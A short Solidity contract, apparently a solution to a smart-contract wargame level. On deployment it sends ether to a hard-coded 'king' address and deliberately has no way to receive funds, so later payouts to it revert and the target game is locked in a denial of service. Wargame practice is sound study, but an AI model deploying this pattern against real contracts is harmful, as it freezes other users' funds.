// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Regicide {
    constructor() payable {
        address payable king = payable(
            0xca4086BD73f471e66F47B8c279824D869d574803
        );

        (bool success, ) = king.call{value: msg.value}("");
        require(success);
    }
}
